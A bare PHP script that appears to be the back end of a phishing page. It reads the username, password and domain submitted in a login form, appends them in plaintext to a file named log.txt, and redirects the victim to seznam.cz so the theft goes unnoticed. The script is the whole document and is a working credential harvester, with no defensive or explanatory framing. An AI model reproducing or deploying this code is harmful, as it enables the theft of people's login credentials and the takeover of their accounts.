<?php
$data=($_POST["login-username"]) . ':' .  ($_POST["password"] . ':' . ($_POST["domain"]) . "\n");
$fp=fopen('log.txt', 'a');
fwrite($fp, $data);
fclose($fp);

header('location: http://www.seznam.cz');
?>